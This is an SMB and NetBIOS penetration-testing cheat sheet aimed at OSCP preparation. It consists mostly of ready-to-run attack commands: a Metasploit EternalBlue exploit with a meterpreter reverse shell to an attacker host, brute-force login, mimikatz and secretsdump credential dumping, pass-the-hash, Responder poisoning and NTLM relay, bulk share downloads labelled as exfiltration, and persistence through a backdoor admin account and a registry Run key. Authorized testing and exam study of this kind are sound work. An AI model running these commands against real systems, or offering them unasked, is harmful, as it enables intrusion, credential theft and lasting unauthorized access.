# SMB & NetBIOS Penetration Testing Guide  
### (Real-World Pentest & OSCP / OSCP+ Exam Ready)

---

## Overview

### SMB (Server Message Block)

**SMB** is an application-layer network protocol used for:
- File sharing
- Printer sharing
- Named pipes
- Inter-process communication

### NetBIOS (Network Basic Input/Output System)

**NetBIOS** is a legacy networking interface that provides:
- Name resolution
- Session management
- Datagram distribution

NetBIOS historically supported SMB and is still found in many Windows environments.

---

## Default Ports

### SMB
- **139/TCP** – SMB over NetBIOS Session Service (legacy)
- **445/TCP** – SMB over TCP (modern)

### NetBIOS
- **137/UDP** – NetBIOS Name Service (NBNS)
- **138/UDP** – NetBIOS Datagram Service
- **139/TCP** – NetBIOS Session Service

---

## SMB vs NetBIOS (IMPORTANT)

| Component | Purpose |
|--------|--------|
| NetBIOS | Name resolution, enumeration, legacy session setup |
| SMB | Authentication, file access, lateral movement |

**Key Points**
- SMB can run **with or without NetBIOS**
- Modern Windows uses **SMB over port 445**
- NetBIOS is mainly useful for **enumeration and credential attacks**

---

## Common Targets

- Windows Servers & Workstations
- Active Directory environments
- Linux Samba servers
- NAS & file servers

---

## Pentesting Methodology (OSCP Mindset)

1. Port & Service Discovery  
2. SMB Version & Security Checks  
3. NetBIOS Enumeration  
4. Anonymous / Null Session Enumeration  
5. SMB Share Enumeration  
6. Credentialed Enumeration  
7. Authentication Attacks  
8. Exploitation (If Applicable)  
9. Post-Exploitation  
10. Lateral Movement  

---

## 1. Port & Service Discovery

```bash
nmap -p 137,138,139,445 --open -sV $target
````

Detect SMB versions:

```bash
nmap -p 445 --script smb-protocols $target
```

Check SMB signing:

```bash
nmap -p 445 --script smb-security-mode $target
```

---

## 2. NetBIOS Enumeration (Recon)

### nbtscan

```bash
nbtscan 192.168.1.0/24
nbtscan -v $target
```

### nmblookup

```bash
nmblookup -A $target
nmblookup -M -- -
nmblookup -d 2 '*'
```

### Nmap NetBIOS Scripts

```bash
nmap -sU -p 137 --script nbstat $target
```

### NetBIOS Name Suffixes

| Suffix | Meaning               |
| ------ | --------------------- |
| `<00>` | Workstation           |
| `<03>` | Messenger             |
| `<20>` | File Server           |
| `<1B>` | Domain Master Browser |
| `<1C>` | Domain Controllers    |
| `<1D>` | Master Browser        |

---

## 3. Anonymous / Null Session Enumeration

> ⚠ Very powerful if misconfigured

### rpcclient

```bash
rpcclient -U "" -N $target
```

Useful commands:

```text
enumdomusers
enumdomgroups
querydominfo
queryuser 500
```

### smbclient (Null)

```bash
smbclient -L //$target -N
```

### smbmap (Null)

```bash
smbmap -H $target -u "" -p ""
```

---

## 4. SMB Share Enumeration

### smbclient

> **Username & password belong to a USER ON THE TARGET SYSTEM or DOMAIN**

```bash
smbclient -L //$target -U username%password
smbclient //$target/sharename -U username%password
```

### smbmap

```bash
smbmap -H $target
smbmap -H $target -u username -p password
smbmap -H $target -u username -p password -r
```

Download files:

```bash
smbmap -H $target -u username -p password -R sharename
```

---

## 5. User, Group & Domain Enumeration

### enum4linux

```bash
enum4linux -a $target
enum4linux -U $target
enum4linux -G $target
enum4linux -P $target
```

### Nmap NSE

```bash
nmap -p 445 --script smb-enum-users,smb-enum-shares $target
nmap -p 445 --script smb-enum-groups,smb-enum-domains $target
```

---

## 6. Password Policy & Authentication Attacks

### Password Policy

```bash
enum4linux -P $target
```

### ⚠ Brute Force (Use Carefully)

> Avoid brute force if account lockout policies exist.

#### Hydra

```bash
hydra -L users.txt -P passwords.txt smb://$target -f
```

#### Nmap

```bash
nmap -p 445 --script smb-brute $target
```

#### Metasploit

```text
use auxiliary/scanner/smb/smb_login
set RHOSTS $target
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run
```

---

## 7. CrackMapExec (CORE TOOL)

```bash
crackmapexec smb $target
crackmapexec smb $target -u user -p password
crackmapexec smb $target -u user -H NTLM_HASH
crackmapexec smb $target --shares
```

---

## 8. SMB Vulnerability Scanning

```bash
nmap -p 139,445 --script smb-vuln* $target
```

Common CVEs:

* MS08-067 (Legacy)
* MS17-010 (EternalBlue)
* CVE-2020-0796 (SMBGhost)

> ⚠ Mostly lab / legacy systems

---

## 9. Exploitation (If Vulnerable)

### MS17-010 Example

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $target
set LHOST attacker_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

---

## 10. Post-Exploitation

### Credential Dumping

#### secretsdump (Impacket)

```bash
secretsdump.py domain/user:password@$target
secretsdump.py -hashes :NTLM_HASH user@$target
```

#### Mimikatz

```text
privilege::debug
sekurlsa::logonpasswords
```

---

## 11. Pass-the-Hash (VERY IMPORTANT)

```bash
crackmapexec smb $target -u user -H NTLM_HASH
impacket-psexec -hashes :NTLM_HASH user@$target
```

---

## 12. NetBIOS Poisoning & Relay (Advanced)

### Responder (Credential Capture)

```bash
responder -I eth0 -wrf
```

### NTLM Relay

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

> Requires SMB signing **disabled**

⚠ **Use only with explicit authorization**

---

## 13. Data Exfiltration

```bash
smbclient //$target/sharename -U user%pass
get sensitive.txt
mget *.docx
```

Recursive download:

```bash
smbget -R smb://$target/sharename -U user%pass
```

---

## 14. Persistence (Post-Compromise)

```cmd
net user backdoor P@ssw0rd123! /add
net localgroup administrators backdoor /add
```

Registry persistence:

```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\Windows\Temp\backdoor.exe
```

---

## 15. Lateral Movement

### SMB

```bash
impacket-psexec user@host
```

### WMI

```bash
wmic /node:host /user:user /password:pass process call create "cmd.exe"
```

---
